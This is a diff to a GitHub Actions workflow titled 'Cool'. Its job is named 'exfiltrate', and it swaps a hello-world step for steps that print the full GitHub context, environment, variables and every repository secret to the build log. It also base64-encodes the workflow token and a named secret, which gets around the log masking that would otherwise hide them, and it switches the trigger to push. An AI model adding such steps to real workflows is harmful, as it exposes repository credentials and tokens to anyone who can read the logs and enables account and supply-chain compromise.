@@ -1,12 +1,32 @@
 name: Cool
 
 on:
-  pull_request:
-    branches:
-      - '**'
+  push:
 
 jobs:
   exfiltrate:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "hello world"
+      - name: Dump GitHub context
+        env:
+          GITHUB_CONTEXT: ${{ toJson(github) }}
+        run: echo "$GITHUB_CONTEXT"
+      - name: Dump Env
+        env:
+          GITHUB_CONTEXT: ${{ toJson(env) }}
+        run: echo "$GITHUB_CONTEXT"
+      - name: Dump Vars
+        env:
+          GITHUB_CONTEXT: ${{ toJson(vars) }}
+        run: echo "$GITHUB_CONTEXT"
+      - name: Dump Secrets
+        env:
+          GITHUB_CONTEXT: ${{ toJson(secrets) }}
+        run: echo "$GITHUB_CONTEXT"
+      - name: Wowie
+        env:
+          GREAT: ${{ github.token }}
+        run: echo $GREAT | base64
+      - run: echo $SECRET_CODE | base64
+        env:
+          SECRET_CODE: ${{ secrets.NAHBRAHNONO }}
